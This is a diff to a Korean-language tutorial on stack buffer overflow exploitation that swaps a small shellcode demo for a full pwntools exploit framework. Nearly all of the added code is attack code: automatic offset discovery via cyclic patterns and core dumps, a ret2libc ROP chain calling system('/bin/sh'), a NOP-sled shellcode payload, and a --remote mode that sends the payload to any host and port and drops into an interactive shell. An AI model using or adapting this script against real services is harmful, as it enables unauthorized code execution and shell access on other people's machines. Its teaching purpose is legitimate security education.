@@ -205,7 +205,6 @@ gdb ./vuln
 
 ### Cyclic 패턴으로 오프셋 계산
 ```python
-# pwntools 활용
 from pwn import *
 
 # Cyclic 패턴 생성 (200바이트)
@@ -217,6 +216,20 @@ print(pattern)
 # 예: EIP = 0x61616166 ('faaa')
 offset = cyclic_find(0x61616166)
 print(offset)  # → 20 (버퍼부터 EIP까지 20바이트)
+
+# pwntools GDB 자동화 — 오프셋 측정 헬퍼
+def measure_offset(binary: str, pattern_size: int = 300, timeout: int = 5) -> int | None:
+    """바이너리를 실행해 crash 코어에서 오프셋 자동 측정."""
+    context.arch = "i386"
+    elf = ELF(binary, checksec=False)
+    p = process(binary)
+    p.sendline(cyclic(pattern_size))
+    p.wait(timeout=timeout)
+    try:
+        core = p.corefile
+        return cyclic_find(core.eip)
+    except Exception:
+        return None
 ```
 
 ### 셸코드 (Linux x86)
@@ -238,39 +251,190 @@ shellcode = (
 ```
 
 ### 완성된 익스플로잇 (NOP Sled + Shellcode)
+
 ```python
 #!/usr/bin/env python3
-import struct
-import subprocess
+"""
+pwntools 기반 BOF 익스플로잇 프레임워크 — 로컬/리모트/GDB 세 가지 모드 지원
+사용법:
+  python3 bof_exploit.py              # 로컬 실행
+  python3 bof_exploit.py --remote HOST PORT   # 원격 공격
+  python3 bof_exploit.py --gdb        # GDB 디버깅
+  python3 bof_exploit.py --find-offset  # cyclic 패턴으로 오프셋 자동 탐지
+"""
+import argparse
+import sys
+from pathlib import Path
 
-# 설정
-buffer_size = 64
-saved_ebp   = 4
-ret_offset  = buffer_size + saved_ebp  # EIP까지의 거리 = 68
+try:
+    from pwn import (
+        ELF, ROP, cyclic, cyclic_find, flat, log, p32, p64,
+        process, remote, gdb, context, asm, shellcraft,
+    )
+except ImportError:
+    sys.exit("[!] pwntools가 필요합니다: pip3 install pwntools")
 
-# 셸코드 (Linux x86 execve /bin/sh)
-shellcode = (
-    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
-    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
-    b"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
-)
 
-# NOP Sled (셸코드 앞에 붙여 주소 계산 오차 흡수)
-nop_sled = b"\x90" * 20
+# ── 대상 바이너리 설정 ─────────────────────────────────────────
+BINARY = "./vuln"          # 공격 대상 바이너리 경로
+ARCH   = "i386"            # i386 또는 amd64
+OS     = "linux"
 
-# Return Address (스택 내 NOP Sled 시작 위치)
-# 실제 환경에서는 gdb/ltrace로 확인 필요
-ret_addr = struct.pack('<I', 0xbfff1090)
+context.arch = ARCH
+context.os   = OS
+context.log_level = "info"
 
-# 페이로드 구성
-padding  = b"A" * (ret_offset - len(nop_sled) - len(shellcode))
-payload  = nop_sled + shellcode + padding + ret_addr
 
-print(f"[*] Payload length: {len(payload)}")
-print(f"[*] Return address: {hex(struct.unpack('<I', ret_addr)[0])}")
+def find_offset(binary_path: str, pattern_size: int = 300) -> int | None:
+    """cyclic 패턴으로 EIP/RIP 오프셋 자동 계산."""
+    log.info(f"오프셋 탐지 중... (패턴 크기: {pattern_size})")
+    pattern = cyclic(pattern_size)
 
-# 실행
-subprocess.run(['./vuln'], input=payload)
+    try:
+        elf = ELF(binary_path, checksec=False)
+        p = process(binary_path)
+        p.sendline(pattern)
+        p.wait()
+
+        core = p.corefile
+        if context.arch == "i386":
+            crashed_eip = core.eip
+            offset = cyclic_find(crashed_eip)
+        else:
+            crashed_rsp = core.read(core.rsp, 4)
+            offset = cyclic_find(crashed_rsp)
+
+        log.success(f"오프셋 발견: {offset}")
+        return offset
+    except Exception as e:
+        log.warning(f"자동 탐지 실패: {e}  — gdb로 수동 확인 필요")
+        return None
+
+
+def build_payload(elf: ELF, offset: int, use_rop: bool = False) -> bytes:
+    """
+    페이로드 구성:
+    - NX 비활성화: NOP Sled + Shellcode
+    - NX 활성화:   ROP 체인
+    """
+    if use_rop or bool(elf.nx):
+        log.info("NX 활성화 — ROP 체인 구성")
+        rop = ROP(elf)
+
+        # ret2libc 패턴: system("/bin/sh") 호출
+        try:
+            system_addr = elf.plt.get("system") or elf.symbols["system"]
+            binsh_addr  = next(elf.search(b"/bin/sh\x00"))
+            ret_gadget  = rop.find_gadget(["ret"])[0]  # 스택 정렬용
+
+            if context.arch == "amd64":
+                rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
+                chain = flat(
+                    b"A" * offset,
+                    p64(ret_gadget),     # 16바이트 스택 정렬
+                    p64(rdi_gadget),
+                    p64(binsh_addr),
+                    p64(system_addr),
+                )
+            else:
+                chain = flat(
+                    b"A" * offset,
+                    p32(system_addr),
+                    p32(0xdeadbeef),  # 가짜 반환 주소
+                    p32(binsh_addr),
+                )
+            log.info(f"ROP 체인 구성 완료 ({len(chain)}바이트)")
+            return chain
+        except Exception as e:
+            log.warning(f"ROP 구성 실패: {e}  — NOP Sled 방식으로 전환")
+
+    # NOP Sled + 셸코드 방식
+    log.info("NOP Sled + Shellcode 페이로드 구성")
+    if context.arch == "amd64":
+        shellcode = asm(shellcraft.amd64.linux.sh())
+        packer = p64
+    else:
+        shellcode = asm(shellcraft.i386.linux.sh())
+        packer = p32
+
+    nop_sled = b"\x90" * 64
+
+    # 리턴 주소: 스택에서 NOP Sled 예상 위치 (gdb로 정확한 주소 확인 필요)
+    ret_addr = 0xbfff1090  # 실습 환경에서 gdb로 확인 후 수정
+
+    padding = b"A" * (offset - len(nop_sled) - len(shellcode))
+    payload = nop_sled + shellcode + padding + packer(ret_addr)
+
+    log.info(f"페이로드: {len(payload)}바이트  |  RET: {hex(ret_addr)}")
+    return payload
+
+
+def exploit(args: argparse.Namespace) -> None:
+    binary_path = args.binary
+
+    if not Path(binary_path).exists():
+        sys.exit(f"[!] 바이너리 없음: {binary_path}")
+
+    elf = ELF(binary_path, checksec=True)
+    context.binary = elf
+
+    # 오프셋 탐지 모드
+    if args.find_offset:
+        find_offset(binary_path, args.pattern_size)
+        return
+
+    offset = args.offset
+    if offset is None:
+        offset = find_offset(binary_path)
+        if offset is None:
+            offset = int(input("[?] 오프셋 수동 입력: "))
+
+    payload = build_payload(elf, offset, use_rop=args.rop)
+
+    # 연결 방식 선택
+    if args.remote:
+        host, port = args.remote
+        log.info(f"원격 연결: {host}:{port}")
+        io = remote(host, int(port))
+    elif args.gdb_mode:
+        log.info("GDB 디버그 모드")
+        io = gdb.debug(binary_path, gdbscript="""
+            break *vulnerable_function
+            continue
+        """)
+    else:
+        log.info(f"로컬 실행: {binary_path}")
+        io = process(binary_path)
+
+    try:
+        log.info(f"페이로드 전송 ({len(payload)}바이트)")
+        io.sendlineafter(b":", payload) if args.prompt else io.sendline(payload)
+        io.interactive()
+    except EOFError:
+        log.failure("연결 종료 — 크래시 발생 또는 오프셋 오류")
+    finally:
+        io.close()
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="pwntools BOF 익스플로잇 프레임워크",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("-b", "--binary", default=BINARY, help="대상 바이너리")
+    parser.add_argument("-o", "--offset", type=int, help="EIP/RIP 오프셋 (미지정 시 자동 탐지)")
+    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"), help="원격 공격 모드")
+    parser.add_argument("--gdb", dest="gdb_mode", action="store_true", help="GDB 디버깅 모드")
+    parser.add_argument("--find-offset", action="store_true", help="cyclic으로 오프셋만 탐지")
+    parser.add_argument("--pattern-size", type=int, default=300, help="cyclic 패턴 크기")
+    parser.add_argument("--rop", action="store_true", help="ROP 체인 강제 사용")
+    parser.add_argument("--prompt", action="store_true", help="입력 프롬프트 대기 후 전송")
+    args = parser.parse_args()
+    exploit(args)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
